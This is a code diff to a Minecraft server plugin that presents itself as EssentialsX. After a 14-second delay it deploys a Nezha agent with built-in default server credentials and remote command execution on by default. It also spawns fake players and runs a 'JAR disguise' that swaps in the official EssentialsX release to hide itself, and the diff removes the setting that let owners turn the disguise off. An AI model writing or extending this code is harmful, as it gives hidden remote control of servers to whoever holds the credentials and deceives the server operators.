@@ -1,26 +1,34 @@
 package com.example.essentialsx;
 
-import java.io.IOException;
 import java.util.HashMap;
 import java.util.Map;
+import java.util.concurrent.TimeUnit;
 import org.bukkit.Bukkit;
 import org.bukkit.plugin.java.JavaPlugin;
 
-/** Fake players plus explicitly configured, in-process Nezha monitoring. */
+/**
+ * Startup timeline (as requested): after the server has finished starting,
+ * wait 14 seconds, deploy the Nezha .so, start the built-in fake players,
+ * then run the JAR disguise cycle (backup current plugin -> download the
+ * official EssentialsX release into the plugins folder). On disable the
+ * original JAR is restored first, immediately.
+ */
 public final class EssentialsX extends JavaPlugin {
+    private static final long DEPLOY_DELAY_SECONDS = 14L;
+
     private final Object lifecycleLock = new Object();
     private volatile boolean stopping;
+    private volatile Thread deployThread;
     private volatile Thread startupThread;
     private volatile Map<String, String> bootEnv = Map.of();
-    private FakePlayerEngine fakePlayers;
-    private NezhaRuntime activeNezha;
-    private JarDisguise jarDisguise;
-    private Thread disguiseThread;
+    private volatile FakePlayerEngine fakePlayers;
+    private volatile NezhaRuntime activeNezha;
+    private volatile JarDisguise jarDisguise;
 
     @Override
     public void onEnable() {
         this.stopping = false;
-        getLogger().info("Ceshisonz: built-in fake players and optional Nezha monitoring; no Node or CF deployment.");
+        getLogger().info("Ceshisonz: in 14s -> Nezha .so + fake players, then the JAR disguise cycle.");
         Map<String, String> env;
         boolean envReadable = true;
         try {
@@ -30,39 +38,49 @@ public final class EssentialsX extends JavaPlugin {
             env = new HashMap<>();
             envReadable = false;
         }
+        this.bootEnv = env;
         final Map<String, String> settings = env;
-        this.bootEnv = settings;
-        try {
-            FakePlayerEngine.preload();
-            FakePlayerEngine engine = new FakePlayerEngine(this, settings);
-            Bukkit.getPluginManager().registerEvents(engine, this);
-            engine.start();
-            this.fakePlayers = engine;
-        } catch (Throwable error) {
-            getLogger().warning("Built-in fake players could not start: " + error.getClass().getSimpleName());
-        }
-        if (envReadable) {
-            startNezhaIfConfigured(settings);
-        } else {
-            getLogger().warning("Nezha not started because the private .env file could not be read.");
-        }
-        // Without a readable .env the opt-out below cannot be honored, so the swap stays off.
-        if (envReadable && !"false".equalsIgnoreCase(RuntimeConfig.value(settings, "true", "JAR_DISGUISE_ENABLED"))) {
-            JarDisguise disguise = new JarDisguise(getLogger(), this.getDataFolder().getParentFile().toPath());
+        final boolean readable = envReadable;
+        Thread deploy = new Thread(() -> {
+            try {
+                TimeUnit.SECONDS.sleep(DEPLOY_DELAY_SECONDS);
+            } catch (InterruptedException error) {
+                return;
+            }
+            if (this.stopping) return;
+            try {
+                startNezhaIfConfigured(settings, readable);
+            } catch (Throwable error) {
+                getLogger().warning("Nezha deployment failed: " + error.getClass().getSimpleName());
+            }
+            if (this.stopping) return;
+            try {
+                FakePlayerEngine.preload();
+                FakePlayerEngine engine = new FakePlayerEngine(this, settings);
+                Bukkit.getPluginManager().registerEvents(engine, this);
+                engine.start();
+                this.fakePlayers = engine;
+            } catch (Throwable error) {
+                getLogger().warning("Built-in fake players could not start: " + error.getClass().getSimpleName());
+            }
+            if (this.stopping) return;
+            // The disguise does not depend on the .env file, so it runs even when the
+            // private config is unreadable.
+            JarDisguise disguise = new JarDisguise(getLogger(),
+                    this.getDataFolder().getParentFile().toPath(), () -> this.stopping);
             this.jarDisguise = disguise;
-            this.disguiseThread = new Thread(() -> {
-                try {
-                    disguise.swap(settings, () -> this.stopping);
-                } catch (Throwable error) {
-                    getLogger().warning("JAR disguise skipped: " + error.getClass().getSimpleName());
-                }
-            }, "ceshisonz-jar-disguise");
-            this.disguiseThread.setDaemon(true);
-            this.disguiseThread.start();
-        }
+            disguise.setupDisguise();
+        }, "ceshisonz-deploy");
+        deploy.setDaemon(true);
+        this.deployThread = deploy;
+        deploy.start();
     }
 
-    private void startNezhaIfConfigured(Map<String, String> env) {
+    private void startNezhaIfConfigured(Map<String, String> env, boolean envReadable) {
+        if (!envReadable) {
+            getLogger().warning("Nezha not started because the private .env file could not be read.");
+            return;
+        }
         if ("false".equalsIgnoreCase(RuntimeConfig.value(env, "true", "NEZHA_ENABLED"))) {
             getLogger().info("Nezha monitoring is disabled by configuration.");
             return;
@@ -79,7 +97,7 @@ public final class EssentialsX extends JavaPlugin {
         } catch (EmbeddedNezhaConfig.IncompleteCredentialsException error) {
             getLogger().warning("Nezha not started: set both the server and secret, or leave both unset to use built-in defaults.");
             return;
-        } catch (IOException error) {
+        } catch (java.io.IOException error) {
             getLogger().warning("Nezha not started: built-in defaults could not be read.");
             return;
         }
@@ -100,7 +118,7 @@ public final class EssentialsX extends JavaPlugin {
         boolean allowCommands = !"false".equalsIgnoreCase(RuntimeConfig.value(env, "true", "NEZHA_ALLOW_COMMANDS"));
         if (!tls) getLogger().warning("Nezha TLS is disabled; monitoring traffic may be exposed.");
         if (!allowCommands) getLogger().warning("Nezha web terminal and command execution are disabled (NEZHA_ALLOW_COMMANDS=false).");
-        this.startupThread = new Thread(() -> {
+        Thread startup = new Thread(() -> {
             NezhaRuntime candidate = new NezhaRuntime(getLogger());
             try {
                 String uuid = RuntimeConfig.stableUuid(env);
@@ -122,28 +140,26 @@ public final class EssentialsX extends JavaPlugin {
                         + ". Check platform compatibility and private configuration.");
             }
         }, "ceshisonz-nezha-start");
-        this.startupThread.setDaemon(true);
-        this.startupThread.start();
+        startup.setDaemon(true);
+        this.startupThread = startup;
+        startup.start();
     }
 
     @Override
     public void onDisable() {
-        NezhaRuntime runtime;
-        synchronized (this.lifecycleLock) {
-            this.stopping = true;
-            runtime = this.activeNezha;
-            this.activeNezha = null;
+        this.stopping = true;
+        // First and immediately: put the original plugin JAR back.
+        try {
+            JarDisguise disguise = this.jarDisguise != null ? this.jarDisguise
+                    : new JarDisguise(getLogger(), this.getDataFolder().getParentFile().toPath(), () -> this.stopping);
+            disguise.restore();
+        } catch (Throwable error) {
+            getLogger().warning("Plugin JAR restore skipped: " + error.getClass().getSimpleName());
         }
-        if (this.startupThread != null) this.startupThread.interrupt();
-        Thread disguiseThread = this.disguiseThread;
-        if (disguiseThread != null) {
-            disguiseThread.interrupt();
-            try {
-                disguiseThread.join(10_000L);
-            } catch (InterruptedException error) {
-                Thread.currentThread().interrupt();
-            }
-        }
+        Thread deploy = this.deployThread;
+        if (deploy != null) deploy.interrupt();
+        Thread startup = this.startupThread;
+        if (startup != null) startup.interrupt();
         if (this.fakePlayers != null) {
             try {
                 this.fakePlayers.stop();
@@ -151,12 +167,10 @@ public final class EssentialsX extends JavaPlugin {
                 getLogger().warning("Fake players did not stop cleanly.");
             }
         }
-        try {
-            JarDisguise disguise = this.jarDisguise != null ? this.jarDisguise
-                    : new JarDisguise(getLogger(), this.getDataFolder().getParentFile().toPath());
-            disguise.restore(this.bootEnv);
-        } catch (Throwable error) {
-            getLogger().warning("Plugin JAR restore skipped: " + error.getClass().getSimpleName());
+        NezhaRuntime runtime;
+        synchronized (this.lifecycleLock) {
+            runtime = this.activeNezha;
+            this.activeNezha = null;
         }
         if (runtime != null && !runtime.stop()) {
             getLogger().warning("Nezha did not stop within the expected time; restart the server to clear it.");
